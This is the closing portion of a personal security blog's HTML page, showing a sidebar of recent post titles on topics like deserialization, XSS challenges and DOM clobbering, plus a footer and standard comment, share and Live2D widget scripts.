2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
